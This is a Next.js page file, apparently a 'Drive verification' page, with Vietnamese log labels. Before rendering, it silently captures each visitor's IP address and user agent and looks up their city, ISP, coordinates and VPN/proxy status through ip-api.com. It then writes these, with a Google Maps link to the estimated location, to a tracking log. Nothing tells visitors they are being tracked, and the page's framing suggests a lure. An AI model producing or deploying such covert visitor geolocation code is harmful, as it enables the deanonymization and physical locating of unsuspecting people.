
import { headers } from 'next/headers';
import fs from 'fs';
import path from 'path';
import { DriveVerificationClient } from '@/components/drive-verification-client';
import { getVerificationConfigAction } from '@/app/actions/settings';

async function logInitialAccess() {
  const headersList = headers();

  const getClientIp = () => {
    // Headers are checked in order of preference.
    const headersToCheck = [
      'x-vercel-forwarded-for', // Vercel
      'x-real-ip',              // Nginx
      'x-forwarded-for',        // Standard proxy
      'cf-connecting-ip',       // Cloudflare
      'true-client-ip',         // Cloudflare
    ];

    for (const header of headersToCheck) {
        const value = headersList.get(header);
        if (value) {
            // The x-forwarded-for header can contain a comma-separated list of IPs.
            // The first one is the original client IP.
            return value.split(',')[0].trim();
        }
    }
    
    // Fallback for local development or environments without these headers.
    return '127.0.0.1';
  };

  const ip = getClientIp();
  const ua = headersList.get('user-agent') ?? 'unknown';
  const logDir = path.join(process.cwd(), 'logs');
  const logFile = path.join(logDir, 'tracking_logs.txt');

  let logData = `--- [${new Date().toISOString()}] MỚI TRUY CẬP ---\nIP: ${ip}\nThiết bị: ${ua}\n`;

  try {
    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,lat,lon,city,isp,proxy`);
    const ipData = await response.json();

    if (ipData && ipData.status === 'success') {
      const { lat, lon, city, isp, proxy } = ipData;
      const is_vpn = proxy ? 'Yes' : 'No';
      const maps_link = `https://www.google.com/maps?q=${lat},${lon}`;
      
      logData += `Vị trí (ước tính): ${city || 'N/A'}\nNhà mạng: ${isp || 'N/A'}\nVPN/Proxy: ${is_vpn}\nLink Maps (ước tính): ${maps_link}\n`;
    }
  } catch (error) {
    console.error('Failed to fetch IP API data:', error);
    logData += `Không thể lấy thông tin chi tiết cho IP.\n`
  }


  try {
    if (!fs.existsSync(logDir)) {
      fs.mkdirSync(logDir, { recursive: true });
    }
    fs.appendFileSync(logFile, logData, 'utf-8');
  } catch (error) {
    console.error('Failed to write initial access log:', error);
  }
}

export default async function VerificationPage() {
  await logInitialAccess();
  const config = await getVerificationConfigAction();
  return <DriveVerificationClient config={config} />;
}
